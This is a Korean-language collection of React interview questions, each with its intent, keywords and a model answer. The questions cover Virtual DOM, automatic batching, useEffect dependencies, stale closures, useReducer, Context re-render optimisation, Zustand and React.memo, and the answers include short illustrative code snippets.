### Q1. React의 Virtual DOM이 브라우저의 일반적인 DOM 조작 방식보다 가지는 진짜 이점은 무엇인가요? 단순히 "더 빠르다"라는 오해를 정정하여 설명해 주세요.

* 의도: 브라우저 렌더링 과정(Reflow, Repaint)의 비용을 이해하고, Virtual DOM의 Batch Update 메커니즘을 정확히 알고 있는지 확인
* 키워드: `Reflow(Layout)` `Repaint(Paint)` `Batching(일괄 업데이트)` `메모리 내 연산(In-memory)` `선언적 UI`

<details>
<summary>답변</summary>

Virtual DOM은 "항상 더 빠르다"는 말은 오해입니다. 실제 이점은 **Batch Update(일괄 처리)**에 있습니다.

실제 DOM을 직접 여러 번 조작하면, 현대 브라우저가 어느 정도 배칭을 하더라도 중간에 레이아웃 정보를 읽는 등의 이유로 강제 Reflow(레이아웃 재계산)와 Repaint(화면 재그리기)가 발생할 수 있으며, 이 두 과정은 비용이 큰 작업입니다.

Virtual DOM은 상태 변경이 일어나면 메모리 내의 가상 트리에 변경 사항을 먼저 누적시킵니다. 이후 `Reconciliation(재조정)` 과정에서 이전 Virtual DOM과 새 Virtual DOM을 비교(Diffing)하여 **변경된 부분만 실제 DOM에 한 번에 반영**합니다. 즉, DOM 접근 횟수를 최소화하여 Reflow/Repaint 비용을 줄이는 것이 핵심입니다.

또한 개발자는 "어떻게 DOM을 바꿀지" 대신 "어떤 상태에서 UI가 어때야 하는지"를 선언적으로 기술할 수 있어 코드의 예측 가능성이 높아집니다.

</details>

### Q2. Virtual DOM이 항상 실제 DOM 조작(Vanilla JS)보다 빠른가요? 그렇지 않다면 어떤 상황에서 Vanilla JS가 더 빠를 수 있나요?

* 의도: 도구의 한계와 트레이드오프를 인지하고 있는지 평가
* 키워드: `초기 렌더링 오버헤드` `정적인 페이지` `메모리 사용량 증가`

<details>
<summary>답변</summary>

**항상 빠른 것은 아닙니다.**

Virtual DOM은 메모리 내 가상 트리를 유지하고, 매 렌더링마다 이전/현재 트리를 비교(Diffing)하는 연산 비용이 존재합니다. 따라서 다음 상황에서는 Vanilla JS가 더 빠를 수 있습니다:

- **단순 DOM 조작이 1~2회만 필요한 경우**: 중간 단계(Virtual DOM 생성 → Diffing → 실제 DOM 반영) 없이 바로 DOM을 변경하는 게 오버헤드가 없습니다.
- **정적인 페이지 또는 초기 렌더링**: Virtual DOM을 구성하고 메모리에 올리는 초기 비용이 있습니다.
- **메모리 제약 환경**: 실제 DOM 외에 가상 트리를 추가로 메모리에 유지해야 합니다.

React(Virtual DOM)가 진가를 발휘하는 것은 **복잡한 UI에서 상태 변화가 잦고, 어떤 DOM 노드가 변경되는지 추적하기 어려울 때**입니다. 이 경우 Diffing을 통한 최소 DOM 업데이트 전략이 수동 최적화보다 효율적입니다.

</details>

### Q3. React 18부터 도입된 'Automatic Batching(자동 배칭)' 기능이 무엇이며, 렌더링 최적화에 어떤 도움을 주는지 알고 계신가요?

* 의도: 최신 React 생태계의 변화와 렌더링 횟수 감소 원리 이해도 평가
* 키워드: `비동기 이벤트(setTimeout, Promise)` `일괄 렌더링` `불필요한 리렌더링 방지`

<details>
<summary>답변</summary>

**Automatic Batching**이란, 여러 `setState` 호출을 하나의 렌더링으로 묶어 처리하는 기능입니다.

React 17까지는 React 이벤트 핸들러 내부에서만 Batching이 적용되었습니다. `setTimeout`, `Promise.then`, 네이티브 이벤트 핸들러 내부에서는 `setState`를 두 번 호출하면 렌더링도 두 번 발생했습니다.

React 18에서는 이 모든 컨텍스트에서 자동으로 Batching이 적용됩니다:

```javascript
// React 18 이전: setTimeout 내부에서 렌더링 2회 발생
setTimeout(() => {
  setCount(c => c + 1); // 렌더링 1
  setFlag(f => !f);     // 렌더링 2
}, 1000);

// React 18 이후: 자동 Batching으로 렌더링 1회만 발생
setTimeout(() => {
  setCount(c => c + 1);
  setFlag(f => !f);     // 두 업데이트가 묶여 렌더링 1회
}, 1000);
```

만약 특정 업데이트를 즉시 개별 렌더링하고 싶다면 `flushSync`를 사용해 Batching을 해제할 수 있습니다.

</details>

### Q4. 함수형 컴포넌트의 생명주기(Lifecycle)를 `useEffect`를 활용하여 어떻게 제어하는지 (Mount, Update, Unmount) 설명하고, 의존성 배열(Dependency Array)의 동작 원리를 런타임 관점에서 설명해 주세요.

* 의도: `useEffect`의 실행 타이밍과 React가 이전 상태와 현재 상태를 비교하는 메커니즘을 런타임 레벨에서 이해하고 있는지 검증
* 키워드: `Mount/Unmount/Update` `Cleanup 함수(정리 함수)` `Object.is (동일성 비교)` `얕은 비교(Shallow Compare)`

<details>
<summary>답변</summary>

`useEffect`는 렌더링 완료 후(Paint 이후) 비동기적으로 실행됩니다.

- **Mount**: 의존성 배열로 `[]`(빈 배열)을 넘기면 컴포넌트가 처음 마운트될 때 한 번만 실행됩니다.
- **Update**: 의존성 배열에 값을 넣으면 해당 값이 변경될 때마다 실행됩니다. 배열을 생략하면 매 렌더링마다 실행됩니다.
- **Unmount**: `useEffect`가 반환하는 **Cleanup 함수**는 컴포넌트가 언마운트될 때 실행됩니다. 또한 다음 Effect 실행 전에도 이전 Cleanup이 먼저 실행됩니다.

```javascript
useEffect(() => {
  // Mount 시 실행 (또는 deps 변경 시)
  const subscription = subscribe(id);

  return () => {
    // Unmount 시 또는 다음 실행 전 Cleanup
    subscription.unsubscribe();
  };
}, [id]);
```

**의존성 배열 동작 원리**: React는 이전 렌더링의 의존성 값과 현재 렌더링의 값을 `Object.is`로 비교합니다. `Object.is`는 `===`와 유사하지만 `NaN === NaN`을 `true`로, `+0 === -0`을 `false`로 처리하는 동일성 비교(identity comparison)입니다. React는 의존성 배열의 각 요소에 대해 `Object.is`를 적용하여 얕은 비교(Shallow Compare)를 수행합니다. 참조 타입(객체, 배열)은 내용이 같아도 참조 주소가 다르면 변경된 것으로 간주합니다.

</details>

### Q5. `useEffect` 내부에서 비동기 함수(예: API 호출)를 직접 콜백으로 사용할 수 없는 이유는 무엇이며, 이를 어떻게 해결해야 하나요?

* 의도: Promise 반환과 Cleanup 함수의 충돌 원리 이해 및 올바른 비동기 패턴 사용 여부 확인
* 키워드: `Cleanup 함수 반환 타입 제약` `Race Condition(경합 조건)` `즉시 실행 함수(IIFE)` `내부 비동기 함수 선언`

<details>
<summary>답변</summary>

`useEffect`의 콜백 함수는 **반환값으로 오직 Cleanup 함수(또는 undefined)만 허용**합니다. `async` 함수는 항상 Promise를 반환하기 때문에 직접 사용하면 React가 반환된 Promise를 Cleanup 함수로 오해하여 경고가 발생합니다.

**해결 방법 1 - 내부에 비동기 함수를 선언하여 호출**:
```javascript
useEffect(() => {
  const fetchData = async () => {
    const data = await api.get('/items');
    setItems(data);
  };
  fetchData();
}, []);
```

**해결 방법 2 - Race Condition 방지 (ignore 플래그)**:
컴포넌트가 언마운트되거나 의존성이 빠르게 변경될 때, 이전 요청 결과가 나중에 도착해 상태를 덮어쓰는 Race Condition이 발생할 수 있습니다. Cleanup 함수로 방어합니다:

```javascript
useEffect(() => {
  let ignore = false;
  const fetchData = async () => {
    const data = await api.get(`/items/${id}`);
    if (!ignore) setItems(data);
  };
  fetchData();
  return () => { ignore = true; };
}, [id]);
```

</details>

### Q6. 의존성 배열에 '참조 타입(객체, 배열, 함수)'을 넣었을 때 의도치 않게 `useEffect`가 무한 루프에 빠지거나 과도하게 실행되는 이유는 무엇이며, 어떻게 방어하나요?

* 의도: 자바스크립트의 얕은 비교(Shallow Compare) 한계 인지 및 참조 동일성 유지 방법 숙련도 평가
* 키워드: `참조 주소 변경` `메모리 재할당` `useMemo` `useCallback` `원시 타입으로 분해해서 넣기`

<details>
<summary>답변</summary>

React의 의존성 배열 비교는 `Object.is` 기반 **얕은 비교**를 사용합니다. 참조 타입은 값이 같아도 렌더링마다 새로운 메모리 주소에 할당되므로 항상 "변경됨"으로 판단됩니다.

```javascript
// 매 렌더링마다 새로운 객체가 생성됨
const options = { page: 1 }; // 주소 0x001

useEffect(() => {
  fetchData(options); // options가 매번 새 객체 → 무한 루프
}, [options]);
```

**방어 방법**:

1. **원시 타입으로 분해해서 넣기** (가장 권장):
```javascript
useEffect(() => { fetchData(page); }, [page]); // page는 number, 안전
```

2. **useMemo로 객체 메모이제이션**:
```javascript
const options = useMemo(() => ({ page, size }), [page, size]);
useEffect(() => { fetchData(options); }, [options]);
```

3. **useCallback으로 함수 참조 고정**:
```javascript
const handler = useCallback(() => doSomething(id), [id]);
useEffect(() => { handler(); }, [handler]);
```

</details>

### Q7. React의 `useState` 상태 업데이트 함수(`setState`)는 왜 비동기적으로 동작하는 것처럼 보일까요? 그리고 이로 인해 발생할 수 있는 '최신 상태가 반영되지 않는 문제'를 어떻게 해결할 수 있나요?

* 의도: React의 렌더링 큐(Queue) 원리와, 이전 상태를 기반으로 안전하게 다음 상태를 계산하는 '함수형 업데이트'의 필요성을 아는지 평가
* 키워드: `비동기 배치(Batch)` `렌더링 큐` `함수형 업데이트(prev => prev + 1)` `최신 상태 보장`

<details>
<summary>답변</summary>

`setState`는 실제로 비동기 함수가 아닙니다. 다만 React가 성능 최적화를 위해 **여러 setState 호출을 배치(Batch)로 묶어 렌더링을 한 번만 수행**하기 때문에 "즉시 반영되지 않는 것처럼" 보입니다.

```javascript
const [count, setCount] = useState(0);

const handleClick = () => {
  setCount(count + 1); // count는 여전히 0
  setCount(count + 1); // count는 여전히 0 → 결과: 1 (2가 아님)
};
```

위 코드에서 두 `setCount` 모두 현재 렌더링 시점의 `count(=0)`를 캡처하므로 최종값은 1이 됩니다.

**해결 방법 - 함수형 업데이트**:
이전 상태를 인자로 받는 함수를 넘기면, React가 큐에서 순서대로 최신 상태를 보장하며 계산합니다:

```javascript
const handleClick = () => {
  setCount(prev => prev + 1); // prev = 0 → 1
  setCount(prev => prev + 1); // prev = 1 → 2 (올바른 결과)
};
```

이전 상태를 기반으로 다음 상태를 계산할 때는 항상 함수형 업데이트를 사용하는 것이 안전합니다.

</details>

### Q8. `setInterval`과 같은 Web API 콜백 내부에서 상태를 업데이트할 때, 최신 상태가 반영되지 않고 초기 상태만 계속 찍히는 **'오래된 클로저(Stale Closure)'** 현상을 겪어본 적이 있나요? 원인과 해결책을 설명해 주세요.

* 의도: JS의 핵심 개념인 '클로저(Closure)'가 React 훅 생태계에서 일으키는 부작용과 그 트러블슈팅 능력을 강하게 검증하는 변별력 높은 질문
* 키워드: `Stale Closure` `스코프 체인 캡처` `함수형 업데이트` `useRef 활용(렌더링 무관 변수)`

<details>
<summary>답변</summary>

**원인**: `setInterval`의 콜백은 등록 시점의 렉시컬 스코프를 클로저로 캡처합니다. 컴포넌트가 리렌더링되어도 이미 등록된 콜백이 참조하는 `count`는 최초 렌더링 시점의 값(예: 0)에 묶여 있어, 항상 `0`에서 계산이 시작됩니다.

```javascript
useEffect(() => {
  const id = setInterval(() => {
    setCount(count + 1); // count는 항상 0 → 계속 1만 출력
  }, 1000);
  return () => clearInterval(id);
}, []); // 빈 배열로 한 번만 등록
```

**해결책 1 - 함수형 업데이트**: 현재 `count`를 참조하지 않으므로 Stale Closure를 피할 수 있습니다.
```javascript
setInterval(() => {
  setCount(prev => prev + 1); // 항상 최신 prev를 받아 계산
}, 1000);
```

**해결책 2 - useRef로 최신 값 참조**: 렌더링과 무관하게 최신 값을 저장하고 읽을 때 사용합니다.
```javascript
const countRef = useRef(count);
useEffect(() => { countRef.current = count; }, [count]);

useEffect(() => {
  const id = setInterval(() => {
    console.log(countRef.current); // 항상 최신 값
  }, 1000);
  return () => clearInterval(id);
}, []);
```

</details>

### Q9. 상태(`State`)와 일반 변수(예: `let` 또는 `useRef`)의 가장 큰 차이점은 무엇이며, React 컴포넌트 내에서 렌더링과 무관하게 값을 유지해야 할 때 무엇을 써야 하나요?

* 의도: State의 본질(렌더링 트리거)을 명확히 이해하고, 목적에 맞게 `useRef`를 분리해서 쓸 수 있는지 확인
* 키워드: `리렌더링 트리거(State)` `라이프사이클 독립적 데이터 보존(useRef)` `DOM 접근`

<details>
<summary>답변</summary>

| 구분 | State (`useState`) | 일반 변수 (`let`) | Ref (`useRef`) |
|---|---|---|---|
| 값 변경 시 렌더링 | O (트리거) | X | X |
| 렌더링 간 값 유지 | O | X (초기화됨) | O |
| 동기적 접근 | X (배치 처리) | O | O (`.current`) |

- **일반 변수**(`let`)는 컴포넌트가 리렌더링될 때마다 초기화됩니다. 렌더링 간 값 유지가 불가합니다.
- **State**는 값이 변경될 때 리렌더링을 트리거하고, 렌더링 간 값을 유지합니다.
- **useRef**는 렌더링을 트리거하지 않으면서 렌더링 간 값을 유지합니다. `.current` 프로퍼티로 접근하며 변경해도 리렌더링이 발생하지 않습니다.

렌더링과 무관하게 값을 유지해야 하는 경우(타이머 ID, 이전 값 기록, DOM 참조 등)에는 `useRef`를 사용합니다. UI에 반영해야 하는 데이터라면 `useState`가 맞습니다.

</details>

### Q10. 복잡한 상태를 관리할 때 `useState` 대신 `useReducer`를 도입하는 명확한 기준은 무엇이며, 컴포넌트 내부에 있던 비즈니스 로직을 `reducer` 함수로 분리했을 때 얻을 수 있는 설계상의 이점은 무엇인가요?

* 의도: 컴포넌트의 역할(UI 렌더링)과 상태 전이 로직(비즈니스 로직)을 명확히 분리할 줄 아는지, 그리고 상태의 '예측 가능성'을 높이는 설계 능력이 있는지 평가
* 키워드: `관심사 분리(Separation of Concerns)` `상태 전이(State Transition)` `Action과 Dispatch` `예측 가능성`

<details>
<summary>답변</summary>

**useReducer 도입 기준**:
- 여러 상태가 서로 연관되어 함께 변경되어야 할 때 (`loading`, `data`, `error` 등)
- 하나의 이벤트에서 여러 상태를 동시에 변경하는 경우
- 상태 전이 로직이 복잡하고 if/switch 분기가 많아질 때
- 상태 업데이트 로직을 컴포넌트 외부로 분리하여 테스트하고 싶을 때

**설계상의 이점**:

1. **관심사 분리**: 컴포넌트는 UI 렌더링에 집중하고, reducer는 상태 전이 로직만 담당합니다.
2. **예측 가능성**: `(state, action) => newState` 형태의 순수 함수로 동일 입력에 항상 동일 출력을 보장합니다.
3. **테스트 용이성**: reducer를 독립적으로 단위 테스트할 수 있습니다.
4. **명시적인 의도**: `dispatch({ type: 'FETCH_SUCCESS', payload: data })`처럼 어떤 행위가 발생했는지 코드에서 명확히 표현됩니다.

</details>

### Q11. `useReducer`를 사용할 때, 상태(State)가 비동기적으로 업데이트되는 로직(예: API 호출 후 데이터 저장)은 리듀서 함수 내부와 외부 중 어디에 위치해야 하며, 그 이유는 무엇인가요?

* 의도: 리듀서가 '순수 함수(Pure Function)'여야 한다는 원칙과 사이드 이펙트(Side Effect)의 올바른 처리 위치 이해도 검증
* 키워드: `순수 함수 원칙` `외부 환경 독립성` `이벤트 핸들러(외부)에서 비동기 처리 후 Dispatch`

<details>
<summary>답변</summary>

비동기 로직은 **리듀서 외부(이벤트 핸들러 또는 useEffect)** 에 위치해야 합니다.

**이유**: reducer는 반드시 **순수 함수(Pure Function)**여야 합니다. 순수 함수는 동일한 입력에 항상 동일한 출력을 반환하며, 외부 상태를 변경하는 사이드 이펙트가 없어야 합니다. API 호출은 외부 환경에 의존하는 사이드 이펙트이므로 reducer 내부에 넣으면 이 원칙이 깨집니다.

올바른 패턴:
```javascript
// 이벤트 핸들러에서 비동기 처리 후 dispatch
const handleFetch = async () => {
  dispatch({ type: 'FETCH_START' });
  try {
    const data = await api.get('/items');
    dispatch({ type: 'FETCH_SUCCESS', payload: data });
  } catch (error) {
    dispatch({ type: 'FETCH_ERROR', payload: error.message });
  }
};

// reducer는 순수하게 상태 전이만 담당
function reducer(state, action) {
  switch (action.type) {
    case 'FETCH_START': return { ...state, loading: true };
    case 'FETCH_SUCCESS': return { loading: false, data: action.payload, error: null };
    case 'FETCH_ERROR': return { loading: false, data: null, error: action.payload };
  }
}
```

</details>

### Q12. 여러 개의 `useState`를 묶어서 하나의 객체 상태로 관리하는 것과, `useReducer`를 사용하는 것은 아키텍처 관점에서 어떤 결정적인 차이가 있나요?

* 의도: 단순한 데이터 그룹화(객체)와 '어떤 행위(Action)를 할 것인가'라는 의도를 캡슐화하는 것의 차이 인지 여부 확인
* 키워드: `상태 업데이트 로직의 중앙 집중화` `행위(Intent) 기반 업데이트` `휴먼 에러 방지`

<details>
<summary>답변</summary>

**객체 상태(useState)**: 데이터를 그룹화하지만, 각 필드를 어떻게 변경할지 로직은 여전히 컴포넌트 곳곳에 흩어집니다. 상태를 직접 조작하는 코드가 여러 곳에 분산되어 일관성 유지가 어렵습니다.

```javascript
// 컴포넌트 내부에 변경 로직이 산재함
setForm(prev => ({ ...prev, name: e.target.value }));
setForm(prev => ({ ...prev, loading: true, error: null }));
```

**useReducer**: 상태 변경 로직을 reducer 하나에 **중앙 집중화**합니다. 컴포넌트는 "어떤 행위가 발생했는지"만 dispatch하고, 실제 상태 변경 방법은 reducer가 독점적으로 책임집니다.

```javascript
dispatch({ type: 'SUBMIT_START' }); // 의도(Intent)만 전달
```

결정적 차이는 **"데이터 묶음 vs 행위 기반 상태 기계"**입니다. 상태 전이가 복잡할수록 useReducer는 휴먼 에러를 방지하고 상태의 유효한 전이 경로를 명확하게 만들어줍니다.

</details>

### Q13. Props Drilling을 해결하기 위해 Context API를 도입할 때, Provider의 상태가 변경되면 하위의 모든 소비(Consumer) 컴포넌트가 불필요하게 리렌더링되는 문제가 자주 발생합니다. 이 현상의 원인과 해결책을 설명해 주세요.

* 의도: Context API의 내부 동작 원리(참조 동일성 평가)를 이해하고 있으며, 실무에서 발생하는 성능 병목 현상을 최적화해 본 경험이 있는지 평가
* 키워드: `참조 동일성(Reference Equality)` `value 객체 재생성 방지` `useMemo` `Context 분할`

<details>
<summary>답변</summary>

**원인**: `<Provider value={...}>` 에 객체 리터럴을 직접 넣으면, Provider 컴포넌트가 리렌더링될 때마다 새로운 객체가 생성됩니다. React는 `value`가 변경됐다고 판단(참조 주소가 다르므로)하여 해당 Context를 구독하는 **모든 하위 컴포넌트를 리렌더링**시킵니다.

```javascript
// 문제: 매 렌더링마다 새 객체 생성
<UserContext.Provider value={{ user, setUser }}>
```

**해결책 1 - useMemo로 value 메모이제이션**:
```javascript
const contextValue = useMemo(() => ({ user, setUser }), [user]);
<UserContext.Provider value={contextValue}>
```

**해결책 2 - Context 분할 (State/Dispatch 분리)**: 자주 변경되는 값과 그렇지 않은 값을 별도 Context로 분리하면, 해당 Context를 구독하는 컴포넌트만 리렌더링됩니다.

```javascript
const UserStateContext = createContext(null);   // 상태
const UserDispatchContext = createContext(null); // dispatch (거의 변경 없음)
```

상태만 필요한 컴포넌트는 `UserStateContext`만, dispatch만 필요한 컴포넌트는 `UserDispatchContext`만 구독하도록 분리합니다.

</details>

### Q14. 상태(State)를 담는 Context와 업데이트 함수(Dispatch)를 담는 Context를 분리(Split)하는 패턴을 사용해 본 적이 있나요? 이것이 리렌더링 최적화에 어떻게 기여하나요?

* 의도: Context 렌더링 최적화의 가장 대표적인 실무 패턴(State/Dispatch 분리) 적용 역량 확인
* 키워드: `Dispatch 함수의 불변성` `구독(Subscription) 분리` `불필요한 평가 방지`

<details>
<summary>답변</summary>

**핵심 원리**: `useReducer`의 `dispatch` 함수는 컴포넌트 생명주기 동안 **참조가 변하지 않습니다(안정적)**. 반면 `state`는 업데이트될 때마다 새로운 참조를 가집니다.

이 특성을 이용해 두 Context를 분리하면:

```javascript
const StateContext = createContext(null);
const DispatchContext = createContext(null);

function Provider({ children }) {
  const [state, dispatch] = useReducer(reducer, initialState);
  return (
    <DispatchContext.Provider value={dispatch}>  {/* dispatch는 안정적 */}
      <StateContext.Provider value={state}>
        {children}
      </StateContext.Provider>
    </DispatchContext.Provider>
  );
}
```

- `state`가 변경되면 `StateContext`를 구독하는 컴포넌트만 리렌더링됩니다.
- `dispatch`만 필요한 버튼 컴포넌트 등은 `DispatchContext`만 구독하므로, **state가 변경되어도 전혀 리렌더링되지 않습니다**.

상태를 읽는 컴포넌트와 상태를 변경하는 컴포넌트를 구독 단위로 분리하는 효과가 있습니다.

</details>

### Q15. Context를 구독하고 있는 하위 컴포넌트 전체를 `React.memo`로 감싸는 것만으로 Context 업데이트 시 발생하는 리렌더링을 막을 수 있나요?

* 의도: Context API가 `React.memo`를 무시하고 컴포넌트를 강제 렌더링시키는 원리를 정확히 알고 있는지 검증
* 키워드: `useContext 구독 우선순위` `리렌더링 강제 통과` `상태와 렌더링 UI의 물리적 분리 필요성`

<details>
<summary>답변</summary>

**막을 수 없습니다.**

`React.memo`는 부모로부터 받은 **props**의 변경 여부를 비교하여 리렌더링을 최적화합니다. 그러나 `useContext`로 직접 구독 중인 Context 값이 변경되면, React는 props 비교와 무관하게 **해당 컴포넌트를 강제로 리렌더링**합니다. `React.memo`는 Context 업데이트를 차단하지 못합니다.

Context 리렌더링을 방지하려면 `React.memo`가 아니라 **구독을 없애거나 분리**해야 합니다:

1. Context 값을 구독하는 컴포넌트(Container)와 실제로 렌더링하는 컴포넌트(Presentational)를 분리합니다.
2. Presentational 컴포넌트는 Context를 직접 구독하지 않고 props로만 받으면, `React.memo`가 동작합니다.
3. 또는 Context 자체를 분할하여 자주 변경되는 값과 그렇지 않은 값을 다른 Context로 관리합니다.

</details>

### Q16. Context API는 엄밀히 말해 '상태 관리' 도구가 아니라 '의존성 주입(Dependency Injection)' 도구에 가깝다고 평가받습니다. 실무 프로젝트에서 Context API 대신 Zustand나 Redux 같은 외부 전역 상태 라이브러리를 도입해야겠다고 판단하는 기술적 기준은 무엇인가요?

* 의도: 도구의 목적을 정확히 알고, 프로젝트의 복잡도에 맞춰 오버엔지니어링 없이 적절한 기술 스택을 선택할 수 있는 판단력 검증
* 키워드: `상태 관리 vs 값 전달` `렌더링 최적화(Selector)` `보일러플레이트` `미들웨어/DevTools`

<details>
<summary>답변</summary>

Context API는 "트리 어디서든 값을 읽을 수 있게 주입하는 것"이 목적이고, 상태 관리(변경 추적, 최적화)는 부가적인 역할입니다.

**외부 상태 라이브러리 도입 기준**:

1. **렌더링 최적화가 중요할 때**: Zustand의 Selector(`useStore(state => state.count)`)는 필요한 상태만 구독하여 해당 값이 변경될 때만 리렌더링됩니다. Context는 이런 세밀한 구독이 기본 제공되지 않습니다.

2. **상태 변경 로직이 비동기/복잡할 때**: Redux Toolkit의 미들웨어(Redux Thunk, Saga)나 Zustand의 비동기 액션 등 상태 변경 흐름을 체계화할 수 있습니다.

3. **디버깅이 중요할 때**: Redux DevTools로 상태 변경 히스토리, 타임 트래블 디버깅이 가능합니다.

4. **여러 컴포넌트 트리에서 상태를 공유할 때**: Context는 Provider 하위에서만 동작하는 반면, 외부 스토어는 트리 구조와 독립적으로 전역 상태를 제공합니다.

반대로 테마, 로그인 사용자 정보, 언어 설정 같이 변경 빈도가 낮고 단방향으로 주입되는 값은 Context API로 충분합니다.

</details>

### Q17. Redux의 'Flux 패턴'과 Context API의 동작 방식은 데이터 흐름 관점에서 어떤 근본적인 차이가 있나요?

* 의도: 전역 상태 관리의 근간이 되는 아키텍처 패턴(단방향 데이터 흐름)에 대한 깊이 있는 이해도 확인
* 키워드: `단방향 데이터 흐름(Unidirectional)` `Store` `중앙 집중형 상태 통제`

<details>
<summary>답변</summary>

**Redux**는 Flux 아키텍처에서 영감을 받은 패턴으로, 엄격한 단방향 데이터 흐름을 강제합니다. 단, Flux와 달리 Redux는 **단일 Store**, **순수 함수 Reducer**, **Dispatcher 없음**(dispatch가 Store에 내장)이라는 구조적 차이가 있습니다:

```
Action → Dispatch → Reducer → Store → View(re-render)
```

- 상태 변경은 반드시 Action을 통해서만 가능하며, reducer라는 순수 함수가 새로운 상태를 계산합니다.
- 상태와 그 변경 방법이 Store에 **중앙 집중화**되어 있어 데이터 흐름 추적이 용이합니다.
- 어떤 컴포넌트도 Store를 직접 변경할 수 없습니다.

**Context API**는 단순히 React 컴포넌트 트리를 통한 **값 전달 메커니즘**입니다:

- Provider가 제공하는 값을 어디서든 읽을 수 있지만, 그 값을 어떻게 변경할지는 Context API가 규정하지 않습니다.
- 상태와 업데이트 함수를 함께 제공하면 유사한 패턴을 구현할 수 있지만, Redux처럼 엄격한 흐름이 강제되지 않습니다.
- 데이터가 트리를 따라 "흘러내려가는" 수직적 구조이고, Redux는 컴포넌트 계층과 무관한 독립적 Store 구조입니다.

</details>

### Q18. 최근 많이 쓰이는 Zustand와 같은 라이브러리는 Context API의 고질적인 '불필요한 리렌더링' 문제를 내부적으로 어떻게 해결하고 있나요?

* 의도: 모던 상태 관리 라이브러리의 핵심 렌더링 최적화 기법(`useSyncExternalStore` 등) 트렌드 파악 여부 평가
* 키워드: `선택적 구독(Selector)` `클로저 기반 독립적 스토어` `외부 스토어 동기화(useSyncExternalStore)`

<details>
<summary>답변</summary>

Zustand는 React Context를 사용하지 않고 **클로저 기반의 독립적 스토어**를 React 외부에서 생성합니다. 이 스토어와 React를 연결할 때 React 18의 `useSyncExternalStore` API를 활용합니다.

**선택적 구독(Selector)**이 핵심입니다:
```javascript
// count만 구독: count가 변경될 때만 리렌더링
const count = useCountStore(state => state.count);

// name만 구독: name이 변경돼도 count 구독 컴포넌트는 리렌더링 안됨
const name = useCountStore(state => state.name);
```

Zustand는 각 컴포넌트가 선택한 Selector의 반환값이 변경됐을 때만 해당 컴포넌트를 리렌더링합니다. Context API는 Provider의 `value` 전체가 바뀌면 모든 구독자가 리렌더링되지만, Zustand는 구독하는 **슬라이스(slice)**가 변경될 때만 반응합니다.

`useSyncExternalStore`는 외부 스토어와 React 렌더링 사이클을 동기화하면서 동시 모드(Concurrent Mode)에서의 tearing 현상을 방지해주는 React 18 공식 API입니다.

</details>

### Q19. React에서 컴포넌트가 리렌더링되는 핵심 조건들을 설명하고, 이 과정에서 발생하는 불필요한 렌더링을 막기 위해 `React.memo`를 어떻게 활용할 수 있는지 원리를 설명해 주세요.

* 의도: React의 렌더링 트리거 메커니즘을 정확히 이해하고, '얕은 비교(Shallow Compare)'를 통한 렌더링 방어 기법을 알고 있는지 평가
* 키워드: `State 변경` `Props 변경` `부모 컴포넌트 렌더링` `얕은 비교(Shallow Compare)` `HOC(Higher Order Component)`

<details>
<summary>답변</summary>

**컴포넌트 리렌더링 조건**:
1. 컴포넌트 자신의 `state`가 변경될 때
2. 부모 컴포넌트가 리렌더링될 때 (props 변경 여부와 무관)
3. 구독 중인 Context 값이 변경될 때
4. `forceUpdate`가 호출될 때 (클래스 컴포넌트)

특히 **부모 리렌더링 시 자식도 리렌더링**되는 것이 가장 많은 불필요한 렌더링의 원인입니다.

**React.memo 활용**:
`React.memo`는 HOC로, 컴포넌트를 감싸면 이전 props와 새 props를 **얕은 비교(Shallow Compare)**하여 변경이 없으면 리렌더링을 건너뜁니다.

```javascript
const MyComponent = React.memo(({ name, count }) => {
  return <div>{name}: {count}</div>;
});
// name과 count가 모두 이전과 같으면 리렌더링 스킵
```

얕은 비교이므로 원시 타입 props는 잘 작동하지만, 객체/배열/함수 props는 매 렌더링마다 새로운 참조가 생성되어 `React.memo`의 효과가 없을 수 있습니다. 이 경우 `useMemo`, `useCallback`과 함께 사용해야 합니다.

</details>

### Q20. `React.memo`로 감싼 컴포넌트인데도 부모 컴포넌트가 렌더링될 때마다 계속 같이 리렌더링된다면, 어떤 원인을 의심해 볼 수 있나요?

* 의도: 참조 타입(객체, 배열, 함수) Props가 매번 새로 생성되어 전달될 때 발생하는 '참조 동일성(Reference Equality)' 문제 파악 능력 검증
* 키워드: `참조 타입 변수` `메모리 주소 변경` `useMemo/useCallback 결합 필요성`

<details>
<summary>답변</summary>

`React.memo`의 얕은 비교가 제대로 작동하지 않는 가장 흔한 원인은 **참조 타입 props가 매 렌더링마다 새로 생성**되는 경우입니다.

```javascript
function Parent() {
  // 부모가 리렌더링될 때마다 새 객체/함수 생성
  const style = { color: 'red' };       // 매번 새 참조
  const handleClick = () => doSomething(); // 매번 새 참조

  return <MemoChild style={style} onClick={handleClick} />;
}
```

`React.memo`는 `style`이나 `handleClick`의 **참조 주소**를 비교하므로, 내용이 같아도 매번 다른 객체로 인식하여 리렌더링됩니다.

**해결 방법**:

- 함수 props: `useCallback`으로 참조를 안정화
```javascript
const handleClick = useCallback(() => doSomething(), []);
```

- 객체/배열 props: `useMemo`로 참조를 안정화
```javascript
const style = useMemo(() => ({ color: 'red' }), []);
```

- 부모 외부로 이동: 렌더링과 무관한 상수 객체는 컴포넌트 밖으로 꺼냅니다.
```javascript
const STYLE = { color: 'red' }; // 모듈 레벨에서 한 번만 생성
```

</details>

### Q21. `React.memo`의 두 번째 인자로 커스텀 비교 함수(Custom Comparison Function)를 넘길 수 있는데, 실무에서 이를 활용해 본 적이 있거나 어떤 상황에서 필요할지 설명해 주세요.

* 의도: 얕은 비교로 해결되지 않는 복잡한 객체 Props나 특정 Props의 변경만 무시하고 싶을 때의 고급 최적화 기법 검증
* 키워드: `areEqual 함수` `커스텀 비교 로직` `특정 필드 무시` `렌더링 통제`

<details>
<summary>답변</summary>

`React.memo`의 두 번째 인자로 `(prevProps, nextProps) => boolean` 형태의 비교 함수를 넘길 수 있습니다. 반환값이 `true`이면 "같다(리렌더링 불필요)", `false`이면 "다르다(리렌더링 필요)"입니다. `shouldComponentUpdate`와 반대 시맨틱에 주의해야 합니다.

**유용한 상황**:

1. **깊은(Deep) 비교가 필요할 때**: props가 중첩 객체이고 참조는 달라도 내용이 같으면 리렌더링을 막고 싶을 때.
```javascript
const MemoChart = React.memo(Chart, (prev, next) =>
  JSON.stringify(prev.data) === JSON.stringify(next.data)
);
```

2. **특정 props 변경을 무시할 때**: 예를 들어 `onClick` 함수가 매번 바뀌어도 렌더링 결과에 영향이 없는 경우.
```javascript
const MemoItem = React.memo(Item, (prev, next) =>
  prev.id === next.id && prev.label === next.label
  // onClick 비교는 의도적으로 생략
);
```

